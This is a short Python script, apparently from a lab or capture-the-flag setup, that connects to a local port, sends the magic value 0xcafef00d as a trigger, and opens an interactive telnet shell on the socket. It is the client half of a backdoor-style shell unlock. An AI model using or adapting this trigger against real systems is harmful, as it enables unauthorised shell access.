#!/usr/bin/env python

"""
run handler then run this
"""

from isis import *

MAGIC_CONSTANT=0xcafef00d
s=get_socket(("localhost",12345))
keyword=pack("I",MAGIC_CONSTANT)
s.send(keyword)

telnet_shell(s)
